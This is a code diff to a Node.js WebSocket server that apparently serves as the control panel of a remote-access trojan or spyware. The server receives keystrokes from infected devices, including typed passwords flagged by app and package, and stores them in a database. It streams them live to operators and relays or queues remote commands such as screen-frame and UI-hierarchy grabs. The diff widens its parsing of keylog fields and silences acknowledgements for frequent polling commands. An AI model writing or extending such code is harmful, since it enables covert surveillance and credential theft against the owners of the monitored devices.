@@ -23,6 +23,15 @@ const sendJson = (ws, o) => {
     try { ws.send(JSON.stringify(o)); } catch {}
 };
 
+// Commands that poll at high frequency — suppress cmd_ack so the feed stays clean
+const SILENT_CMDS = new Set([
+  'REQUEST_HIERARCHY',
+  'PING',
+  'PONG',
+  'HEARTBEAT',
+  'GET_FRAME',
+]);
+
 function broadcast(obj) {
   const msg = JSON.stringify(obj);
   for (const ws of operators.values())
@@ -193,19 +202,19 @@ async function routeDevMsg(devId, devIdBuf, ws, raw, isBinary) {
       const keystrokes = Array.isArray(keylogObj.keystrokes) ? keylogObj.keystrokes : null;
       if (keystrokes && keystrokes.length > 0) {
         for (const k of keystrokes) {
-          const app = k.app || k.app_name || '';
-          const pkg = k.pkg || '';
-          const text = k.text || '';
-          const isPass = !!k.is_password;
+          const app    = k.app    || k.appName  || k.app_name  || '';
+          const pkg    = k.pkg    || k.package  || k.packageName || '';
+          const text   = k.text   || k.data     || '';
+          const isPass = !!(k.is_password || k.isPassword || k.password);
           await run(`INSERT INTO keylogs(dev_id,app,pkg,text,is_password) VALUES(?,?,?,?,?)`,
             [devId, app, pkg, text, isPass ? 1 : 0]);
           broadcast({ type: 'keylog', id: devId, data: { app, pkg, text, is_password: isPass, ts: k.ts || Date.now() } });
         }
       } else {
-        const app    = keylogObj.app  || '';
-        const pkg    = keylogObj.pkg  || keylogObj.package || '';
-        const text   = keylogObj.text || keylogObj.data || (typeof data === 'string' ? data : '');
-        const isPass = !!keylogObj.is_password;
+        const app    = keylogObj.app    || keylogObj.appName  || keylogObj.appname  || '';
+        const pkg    = keylogObj.pkg    || keylogObj.package  || keylogObj.packageName || '';
+        const text   = keylogObj.text   || keylogObj.data     || (typeof data === 'string' ? data : '');
+        const isPass = !!(keylogObj.is_password || keylogObj.isPassword || keylogObj.password);
         await run(`INSERT INTO keylogs(dev_id,app,pkg,text,is_password) VALUES(?,?,?,?,?)`,
           [devId, app, pkg, text, isPass ? 1 : 0]);
         broadcast({ type: 'keylog', id: devId, data: { app, pkg, text, is_password: isPass, ts: Date.now() } });
@@ -526,16 +535,17 @@ async function handleOperator(ws, req) {
     switch (type) {
 
       case 'cmd': {
-        const cmd  = payload?.cmd  || msgCmd;
-        const args = payload?.args || msgArgs || {};
+        const cmd    = payload?.cmd  || msgCmd;
+        const args   = payload?.args || msgArgs || {};
+        const silent = !!(msg.silent || payload?.silent || SILENT_CMDS.has(cmd));
         if (!cmd) return;
         const dev = devices.get(target);
         if (dev && dev.readyState === WebSocket.OPEN) {
           sendJson(dev, { action: cmd, type: cmd, ...args });
-          sendJson(ws,  { type: 'cmd_ack', target, cmd, delivered: true });
+          if (!silent) sendJson(ws, { type: 'cmd_ack', target, cmd, delivered: true });
         } else {
           enqueueCmd(target, cmd, args).catch(() => {});
-          sendJson(ws, { type: 'cmd_queued', target, cmd });
+          if (!silent) sendJson(ws, { type: 'cmd_queued', target, cmd });
         }
         break;
       }
